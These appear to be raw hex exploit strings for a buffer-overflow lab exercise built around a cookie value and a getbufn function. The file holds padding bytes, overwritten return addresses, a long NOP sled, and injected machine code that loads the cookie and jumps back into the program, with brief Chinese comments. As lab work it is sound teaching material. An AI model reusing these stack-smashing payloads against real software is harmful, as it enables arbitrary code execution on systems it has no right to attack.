cookie 0x1ee1f856 memory in cookie 0x804b318
ret c3
 

01 02 03 04 05 06 07 08
09 10 11 12 13
 14 15 16
17 18 19 20 21 22 23 24
25 26 27 28 29 30 31 
32
33 34 35 36 
9b 91 04 08




01 02 03 04 05 06 07 08
09 10 11 12 13
 14 15 16
17 18 19 20 21 22 23 24
25 26 27 28 29 30 31 
32
33 34 35 36 
50 91 04 08
00 00 00 00 
56 f8 e1 1e


b8 56 f8 e1 1e
a3 24 b3 04 08
68 03 91 04 08
c3
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
30 3e 68 55



b8 56 f8 e1 1e
68 35 8d 04 08
c3
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00
70 3e 68 55
30 3e 68 55



90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
68 d1 8c 04 08 （push call getbufn 后的地址）
8d 6c 24 1c     （lea 0x1c(%esp),%ebp  ）
b8 56 f8 e1 1e （move cookie）
c3             （ret）
30 3e 68 55    (写原值）
10 3d 68 55    (跳转地址）

